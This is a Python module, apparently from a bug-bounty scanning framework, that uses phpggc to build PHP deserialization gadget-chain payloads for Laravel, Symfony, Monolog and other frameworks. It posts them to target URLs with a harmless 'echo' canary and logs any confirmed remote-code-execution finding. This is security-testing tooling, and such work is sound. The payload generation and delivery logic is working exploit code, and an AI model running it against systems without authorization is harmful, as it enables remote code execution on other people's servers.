"""PhpggcTool -- PHP deserialization exploitation via phpggc."""

from __future__ import annotations

import asyncio
import base64
import os

import aiohttp

from lib_webbh import setup_logger
from lib_webbh.scope import ScopeManager

from workers.vuln_scanner.base_tool import VulnScanTool
from workers.vuln_scanner.concurrency import WeightClass, get_semaphore

logger = setup_logger("phpggc-tool")

PHPGGC_TIMEOUT = int(os.environ.get("PHPGGC_TIMEOUT", "300"))

# Framework-specific gadget chains
GADGET_CHAINS: dict[str, list[str]] = {
    "laravel": ["Laravel/RCE1", "Laravel/RCE2", "Laravel/RCE3", "Laravel/RCE4"],
    "symfony": ["Symfony/RCE1", "Symfony/RCE2", "Symfony/RCE3", "Symfony/RCE4"],
    "magento": ["Magento/SQLI1", "Magento/FW1"],
    "wordpress": ["WordPress/RCE1", "WordPress/RCE2"],
    "yii": ["Yii/RCE1", "Yii/RCE2"],
    "guzzle": ["Guzzle/RCE1"],
    "monolog": ["Monolog/RCE1", "Monolog/RCE2", "Monolog/RCE3"],
    "slim": ["Slim/RCE1"],
    "doctrine": ["Doctrine/RCE1", "Doctrine/RCE2"],
}

# Default chains to try when no specific framework is detected
DEFAULT_CHAINS = [
    "Laravel/RCE1",
    "Symfony/RCE1",
    "Monolog/RCE1",
    "Guzzle/RCE1",
]

# PHP-related tech-stack keywords
PHP_KEYWORDS = frozenset([
    "php", "laravel", "symfony", "magento", "wordpress",
    "drupal", "joomla", "yii", "codeigniter", "cakephp",
    "slim", "lumen",
])

# Canary for detection
CANARY_CMD = "echo phpggc_canary"


class PhpggcTool(VulnScanTool):
    """PHP deserialization exploitation via phpggc."""

    name = "phpggc"
    weight_class = WeightClass.HEAVY

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _has_php_tech(tech_stack: dict | None) -> bool:
        """Return True if tech_stack suggests PHP platform."""
        if not tech_stack:
            return False
        text = str(tech_stack).lower()
        return any(kw in text for kw in PHP_KEYWORDS)

    @staticmethod
    def _detect_framework(tech_stack: dict | None) -> str | None:
        """Return the PHP framework name if detected."""
        if not tech_stack:
            return None
        text = str(tech_stack).lower()
        for framework in GADGET_CHAINS:
            if framework in text:
                return framework
        return None

    def _get_chains_for_tech(self, tech_stack: dict | None) -> list[str]:
        """Return the gadget chain list appropriate for the detected framework."""
        framework = self._detect_framework(tech_stack)
        if framework:
            return GADGET_CHAINS.get(framework, DEFAULT_CHAINS)
        return DEFAULT_CHAINS

    async def _generate_payload(self, chain: str, function: str, argument: str) -> bytes | None:
        """Generate a serialized payload using phpggc."""
        cmd = ["phpggc", chain, function, argument]
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout_bytes, _ = await asyncio.wait_for(
                proc.communicate(), timeout=30
            )
            if proc.returncode == 0 and stdout_bytes:
                return stdout_bytes
        except (asyncio.TimeoutError, Exception):
            pass
        return None

    async def _send_payload(
        self,
        session: aiohttp.ClientSession,
        url: str,
        payload: bytes,
        headers: dict | None,
    ) -> tuple[bool, str]:
        """Send a serialized PHP payload and check for indicators."""
        send_headers = dict(headers or {})
        send_headers["Content-Type"] = "application/x-php-serialized"

        try:
            async with session.post(
                url,
                data=payload,
                headers=send_headers,
                timeout=aiohttp.ClientTimeout(total=30),
                ssl=False,
            ) as resp:
                body = await resp.text()
                # Check for canary in response
                if "phpggc_canary" in body:
                    return True, f"Canary detected in response (status={resp.status})"
                # Check for deserialization errors indicating processing
                if resp.status == 500:
                    low = body.lower()
                    if "unserialize" in low or "deserializ" in low or "__wakeup" in low or "__destruct" in low:
                        return True, "PHP deserialization error triggered (status=500)"
                return False, ""
        except (aiohttp.ClientError, OSError, TimeoutError):
            return False, ""

    # ------------------------------------------------------------------
    # Execute
    # ------------------------------------------------------------------

    async def execute(
        self,
        target,
        scope_manager: ScopeManager,
        target_id: int,
        container_name: str,
        headers: dict | None = None,
        **kwargs,
    ) -> dict:
        log = logger.bind(target_id=target_id)
        triaged_findings = kwargs.get("triaged_findings")
        scan_all = kwargs.get("scan_all", False)

        if await self.check_cooldown(target_id, container_name):
            log.info("Skipping phpggc -- within cooldown")
            return {"found": 0, "in_scope": 0, "new": 0, "skipped_cooldown": True}

        stats = {"found": 0, "in_scope": 0, "new": 0, "skipped_cooldown": False}
        sem = get_semaphore(self.weight_class)

        # Collect URLs to test with their chain lists
        urls_to_test: list[tuple[int | None, str, list[str]]] = []

        if triaged_findings:
            # -- Stage 2: confirm specific deserialization findings --
            for _vuln_id, asset_id, _severity, _title, poc in triaged_findings:
                target_url = poc or ""
                if not target_url.startswith("http"):
                    continue
                tech_stack = await self._get_tech_stack(asset_id) if asset_id else None
                chains = self._get_chains_for_tech(tech_stack)
                urls_to_test.append((asset_id, target_url, chains))

        elif scan_all:
            # -- Stage 3: only target PHP tech-stack URLs --
            all_url_assets = await self._get_all_url_assets(target_id)
            for asset_id, url in all_url_assets:
                if not url.startswith("http"):
                    continue
                tech_stack = await self._get_tech_stack(asset_id)
                if not self._has_php_tech(tech_stack):
                    continue
                if await self._has_confirmed_vuln(target_id, asset_id, "deserialization"):
                    log.debug(f"Skipping {url} -- already confirmed PHP deser")
                    continue
                chains = self._get_chains_for_tech(tech_stack)
                urls_to_test.append((asset_id, url, chains))
        else:
            log.info("No triaged findings or scan_all -- skipping")
            return stats

        if not urls_to_test:
            log.info("No PHP targets found for phpggc")
            await self.update_tool_state(target_id, container_name)
            return stats

        async with aiohttp.ClientSession() as session:
            for asset_id, url, chains in urls_to_test:
                vuln_found = False

                for chain in chains:
                    if vuln_found:
                        break

                    async with sem:
                        payload = await self._generate_payload(
                            chain, "system", CANARY_CMD
                        )
                        if not payload:
                            log.debug(f"Failed to generate {chain} payload")
                            continue

                        is_vuln, detail = await self._send_payload(
                            session, url, payload, headers
                        )

                    if is_vuln:
                        vuln_found = True
                        stats["found"] += 1
                        stats["in_scope"] += 1
                        stats["new"] += 1
                        b64_payload = base64.b64encode(payload[:200]).decode()
                        poc_text = (
                            f"phpggc chain={chain}\n"
                            f"Payload (b64, truncated): {b64_payload}\n"
                            f"Detail: {detail}"
                        )

                        if triaged_findings:
                            for vuln_id, _aid, severity, title, _poc in triaged_findings:
                                if _aid == asset_id:
                                    await self._update_vulnerability(
                                        vuln_id=vuln_id,
                                        severity="critical",
                                        poc=poc_text,
                                        source_tool="phpggc",
                                        description=f"phpggc confirmed PHP deserialization: {title}",
                                    )
                                    break
                        else:
                            await self._save_vulnerability(
                                target_id=target_id,
                                asset_id=asset_id,
                                severity="critical",
                                title=f"PHP Deserialization RCE ({chain}) - {url}",
                                description=f"phpggc detected PHP deserialization via {chain} at {url}",
                                poc=poc_text,
                            )
                        log.info(f"phpggc found deserialization at {url} (chain={chain})")

        await self.update_tool_state(target_id, container_name)
        log.info("phpggc complete", extra=stats)
        return stats
